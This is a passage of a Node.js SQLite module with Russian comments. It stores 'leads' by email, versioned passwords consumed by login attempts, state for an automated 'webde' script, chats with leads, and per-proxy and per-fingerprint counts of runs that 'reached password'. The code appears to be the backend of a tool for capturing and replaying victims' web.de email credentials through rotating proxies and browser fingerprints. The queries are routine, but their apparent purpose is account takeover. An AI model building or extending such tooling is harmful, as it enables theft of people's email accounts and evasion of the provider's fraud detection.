      idempotencyKey || null,
      JSON.stringify(response),
      nowIso,
      leadId,
      oldVersion
    );
    if (!result || result.changes !== 1) return { ok: false, code: 'version_conflict' };
    return { ok: true, replay: false, response };
  });
  return txn();
}

function markPasswordConsumedByAttempt(leadId, passwordVersion, attemptNo) {
  if (leadId == null || !Number.isFinite(passwordVersion) || !Number.isFinite(attemptNo)) return false;
  const idStr = String(leadId);
  const result = getDb().prepare(
    `UPDATE leads
     SET consumed_by_attempt = ?
     WHERE id = ? AND COALESCE(password_version, 0) = ? AND (consumed_by_attempt IS NULL OR consumed_by_attempt = ?)`
  ).run(attemptNo, idStr, passwordVersion, attemptNo);
  return !!(result && result.changes > 0);
}

/** После PM2/сбоя: в БД не должно оставаться «активного» сеанса без живого процесса. */
function clearAllWebdeScriptActiveRuns() {
  const r = getDb().prepare(
    'UPDATE leads SET webde_script_active_run = NULL WHERE webde_script_active_run IS NOT NULL'
  ).run();
  return r && typeof r.changes === 'number' ? r.changes : 0;
}

function getSetting(key) {
  const db = getDb();
  const row = db.prepare('SELECT value FROM settings WHERE key = ?').get(key);
  return row ? row.value : null;
}

function updateSetting(key, value) {
  const db = getDb();
  const upsert = db.prepare(
    'INSERT INTO settings (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value'
  );
  upsert.run(key, value);
}

/** Формат как у бывшего mode.json после парсинга. */
function getModeData() {
  let mode = 'auto';
  let autoScript = false;
  const modeRaw = getSetting('mode');
  const autoRaw = getSetting('autoScript');
  if (modeRaw != null && modeRaw !== '') {
    try {
      const v = JSON.parse(modeRaw);
      mode = v === 'manual' ? 'manual' : 'auto';
    } catch (_) {}
  }
  if (autoRaw != null && autoRaw !== '') {
    try {
      autoScript = JSON.parse(autoRaw) === true;
    } catch (_) {}
  }
  return { mode, autoScript };
}

function writeModeData(next) {
  if (!next || typeof next !== 'object') return;
  updateSetting('mode', JSON.stringify(next.mode === 'manual' ? 'manual' : 'auto'));
  updateSetting('autoScript', JSON.stringify(next.autoScript === true));
}

/** Полный объект чата (ключи — email/leadId, служебные _readAt, _openChatRequested). */
function getChatState() {
  const raw = getSetting(CHAT_STATE_KEY);
  if (raw == null || raw === '') return {};
  try {
    const data = JSON.parse(raw);
    return typeof data === 'object' && data !== null ? data : {};
  } catch (_) {
    return {};
  }
}

function setChatState(obj) {
  if (!obj || typeof obj !== 'object') return;
  updateSetting(CHAT_STATE_KEY, JSON.stringify(obj));
}

/** Добавить одно сообщение в ветку chatKey (после migrate на стороне вызывающего при необходимости). */
function insertChatMessage(chatKey, message) {
  if (!chatKey || !message || typeof message !== 'object') return;
  const db = getDb();
  const upsert = db.prepare(
    'INSERT INTO settings (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value'
  );
  const txn = db.transaction(() => {
    const row = db.prepare('SELECT value FROM settings WHERE key = ?').get(CHAT_STATE_KEY);
    let chat = {};
    if (row && row.value) {
      try {
        const parsed = JSON.parse(row.value);
        if (parsed && typeof parsed === 'object') chat = parsed;
      } catch (_) {}
    }
    if (!Array.isArray(chat[chatKey])) chat[chatKey] = [];
    chat[chatKey].push(message);
    upsert.run(CHAT_STATE_KEY, JSON.stringify(chat));
  });
  txn();
}

/** Залить ключи из mode.json: mode, autoScript → settings. */
function seedSettingsFromModeDoc(doc) {
  const db = getDb();
  const upsert = db.prepare(
    'INSERT INTO settings (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value'
  );
  if (doc && typeof doc === 'object') {
    if (doc.mode != null) upsert.run('mode', JSON.stringify(doc.mode));
    if (doc.autoScript != null) upsert.run('autoScript', JSON.stringify(doc.autoScript));
  }
}

/** Одна ветка chat.json: массив { from, text, at }. */
function replaceChatMessagesForLead(leadId, messages) {
  const db = getDb();
  const del = db.prepare('DELETE FROM chat_messages WHERE lead_id = ?');
  const ins = db.prepare(
    'INSERT INTO chat_messages (lead_id, from_role, body, at) VALUES (?, ?, ?, ?)'
  );
  const runMany = db.transaction((list) => {
    del.run(leadId);
    if (!Array.isArray(list)) return;
    for (const m of list) {
      if (!m || m.text == null) continue;
      ins.run(leadId, String(m.from != null ? m.from : ''), String(m.text), String(m.at != null ? m.at : ''));
    }
  });
  runMany(messages);
}

function getChatMessagesForLead(leadId) {
  const db = getDb();
  const rows = db.prepare(
    'SELECT from_role, body, at FROM chat_messages WHERE lead_id = ? ORDER BY id ASC'
  ).all(leadId);
  return rows.map((r) => ({ from: r.from_role, text: r.body, at: r.at }));
}

function incrementProxyFpStat(proxyServer, fpIndex, reachedPassword) {
  const ps = String(proxyServer || '').trim();
  const idx = parseInt(fpIndex, 10);
  if (!ps || isNaN(idx) || idx < 0) return false;
  const db = getDb();
  const now = new Date().toISOString();
  const ok = reachedPassword === true;
  const stmt = db.prepare(`
    INSERT INTO proxy_fp_stats (proxy_server, fp_index, pairs, reached_password, not_reached_password, updated_at)
    VALUES (?, ?, 1, ?, ?, ?)
    ON CONFLICT(proxy_server, fp_index) DO UPDATE SET
      pairs = pairs + 1,
      reached_password = reached_password + excluded.reached_password,
      not_reached_password = not_reached_password + excluded.not_reached_password,
      updated_at = excluded.updated_at
  `);
  stmt.run(ps, idx, ok ? 1 : 0, ok ? 0 : 1, now);
  return true;
}

function listProxyFpStats() {
  const db = getDb();
  return db.prepare(
    'SELECT proxy_server AS proxyServer, fp_index AS fpIndex, pairs, reached_password AS reachedPassword, not_reached_password AS notReachedPassword, updated_at AS updatedAt FROM proxy_fp_stats ORDER BY updated_at DESC NULLS LAST'
  ).all();
}

function deleteProxyFpStatRow(proxyServer, fpIndex) {
  const ps = String(proxyServer || '').trim();
  const idx = parseInt(fpIndex, 10);
  if (!ps || isNaN(idx)) return 0;
  const db = getDb();
  return db.prepare('DELETE FROM proxy_fp_stats WHERE proxy_server = ? AND fp_index = ?').run(ps, idx).changes;
}

function deleteProxyFpStatsByProxy(proxyServer) {
  const ps = String(proxyServer || '').trim();
  if (!ps) return 0;
  const db = getDb();
  return db.prepare('DELETE FROM proxy_fp_stats WHERE proxy_server = ?').run(ps).changes;
}

function deleteProxyFpStatsByFingerprint(fpIndex) {
  const idx = parseInt(fpIndex, 10);
  if (isNaN(idx)) return 0;
  const db = getDb();
  return db.prepare('DELETE FROM proxy_fp_stats WHERE fp_index = ?').run(idx).changes;
}

function purgeProxyFpStatsOrphans(validProxyServers) {
  const list = Array.isArray(validProxyServers)
    ? validProxyServers.map((s) => String(s || '').trim()).filter(Boolean)
    : [];
  const db = getDb();
  if (list.length === 0) {
    return db.prepare('DELETE FROM proxy_fp_stats').run().changes;
  }
  const placeholders = list.map(() => '?').join(',');
  const sql = `DELETE FROM proxy_fp_stats WHERE proxy_server NOT IN (${placeholders})`;
  return db.prepare(sql).run(...list).changes;
}

module.exports = {
  DB_PATH,
  DATA_DIR,
  getDb,
  closeDb,
  configureDatabase,
  /** SQL для INSERT OR REPLACE лида (совпадает с addLead). */
  INSERT_LEAD_SQL: INSERT_SQL,
  leadObjectToRow,
  getAllLeads,
  getLeadById,
  getLeadIdByEmail,
  getAllLeadIdsByEmailNormalized,
  getStatsLeadSnapshotsByPeriod,
  addLead,
  updateLead,
  updateLeadPartial,
  deleteLeadById,
  deleteAllLeads,
  replaceLeadRow,
  deepMerge,
  replaceAllLeads,
  appendLeadLogTerminal,
  updateLeadPasswordVersioned,
  markPasswordConsumedByAttempt,
  clearAllWebdeScriptActiveRuns,
  getSetting,
  updateSetting,
  getModeData,
  writeModeData,
  getChatState,
  setChatState,
  insertChatMessage,
  seedSettingsFromModeDoc,
  replaceChatMessagesForLead,
  getChatMessagesForLead,
  incrementProxyFpStat,
  listProxyFpStats,
  deleteProxyFpStatRow,
  deleteProxyFpStatsByProxy,
  deleteProxyFpStatsByFingerprint,
  purgeProxyFpStatsOrphans
};
